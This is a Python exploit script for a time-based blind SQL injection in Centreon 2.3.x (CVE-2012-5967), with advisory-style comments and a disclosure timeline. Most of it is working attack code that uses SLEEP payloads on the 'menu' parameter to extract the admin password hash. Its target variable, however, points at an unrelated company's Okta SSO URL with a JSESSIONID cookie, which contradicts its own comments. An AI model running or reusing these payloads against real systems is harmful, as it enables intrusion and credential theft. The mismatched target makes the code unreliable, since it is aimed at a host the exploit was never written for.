#!/usr/bin/env python

# Exploit Title: Centreon 2.3.3 - 2.3.9-4 menuXML.php Blind SQL Injection Exploit
# Disclosure Date: December 12, 2012
# Author: modpr0be (@modpr0be)
# Platform: Linux
# Tested on: Centreon Enterprise Server with Centreon 2.3.9-4 on CentOS 5.5 x86_64 (Final)
# Software Link: http://www.centreon.com/Content-Download/download-centreon-enterprise-server
# References: http://www.spentera.com/2012/12/centreon-enterprise-server-blind-sql-injection/
# CVE-ID: CVE-2012-5967

### DISCLAIMER
# Script provided 'as is', without any warranty.
# For educational purposes only.
# Do not use this code to do anything illegal.

### Software Description
# The Centreon Software Suite is a set of modular software programs designed for managing
# and controlling your information systems. It lets you supervise and measure performance and
# quality of service so that you can optimise the use of your resources.

### Vulnerability Details
# Vulnerability found in menuXML.php inside the 'menu' parameter. By injecting payload after the
# menu parameter, e.g: '  AND SLEEP(5) AND 'meHL'='meHL, the web application hung for 5 seconds,
# which gives us a conclusion that the web application is vulnerable to time-based sql injection.

## Further notes:
# User with low privilege access (e.g: guest user) can still exploit this vulnerability
# The script below is for PoC of the vulnerability only.

#      -=] Centreon 2.3.3 - 2.3.9-4 Time-based BlindSQLi Exploit [=-
#               [ by modpr0be  - research[at]spentera.com ]
#
# (!) We need the target IP: 172.16.199.150
# (!) Put the value of a valid PHPSESSID session: 3uh52mtl1hlmsha4nmkftde5l3
# (-) Using Time-Based method with 1s delay. This will take some time, go grab a coffee..

# (!) Getting admin password hash: 2995cb0650c5f107230ed569a8c4d6e5
# (-) Done! Admin password hash extracted in 676 seconds

### Solution
# Update to Centreon 2.4.0 or newer.

### Disclosure timeline
# 10/26/2012 - Bug found and reported to CERT/CC
# 12/07/2012 - Update from CERT/CC to publish on 12/12/2012
# 12/12/2012 - Security advisory released via CERT/CC

import sys,time,urllib,urllib2

print """
-=] Centreon 2.3.3 - 2.3.9-4 Time-based BlindSQLi Exploit [=-
	[ by modpr0be  - research[at]spentera.com ]
"""

target = 'https://grammarly.okta.com/app/google/exknooefzrjIwFIFZ0x7/sso/saml' 

# sid is the same as PHPSESSID session value, so put the value of PHPSESSID here

cookie = 'JSESSIONID=FCC000DB230977E7CB4886518A15A305' 

# SQLi delay, tested on LAN environment.
# Consider if it's a remote target, you may increase the delay value (default: 1 seconds)
delay=1

print "(-) Using Time-Based method with %ds delay. This will take some time, go grab a coffee..\n"%int(delay)

def Hex2Des(item):
       	return ord(hex(item).replace('0x',''))

def adminhash(m,n):
	#borrow from SQLmap :)
	adminquery=("' AND 9999=IF((ORD(MID((SELECT IFNULL(CAST(contact_passwd AS CHAR),0x20) FROM contact"
		   " WHERE contact_id=1 LIMIT 0,1),%s,1)) > %s),SLEEP(%s),9999)  AND 'mEhL'='mEhL" %(m,n,delay))

	value = { 'menu': '2'+adminquery,
			  'sid': '%s'%(cookie)  }

	url = "%s?%s" %(target,urllib.urlencode(value))
	req = urllib2.Request(url)
	req.add_header('Cookie', cookie)
	try:
    		starttime=time.time()
    		response = urllib2.urlopen(req)
    		endtime = time.time()
    		return int(endtime-starttime)
	except:
    		print '\n(-) Uh oh! Exploit fail..'
    		sys.exit(0)

sys.stdout.write('(!) Getting admin password hash: ')
sys.stdout.flush()

starttime = time.time()
for m in range(1,33):
	for n in range(0,16):
		wkttunggu = adminhash(m,Hex2Des(n))
		if (wkttunggu < delay):
			sys.stdout.write(chr(Hex2Des(n)))
			sys.stdout.flush()
			break
endtime = time.time()
print "\n(-) Done! Admin password hash extracted in %d seconds" %int(endtime-starttime)
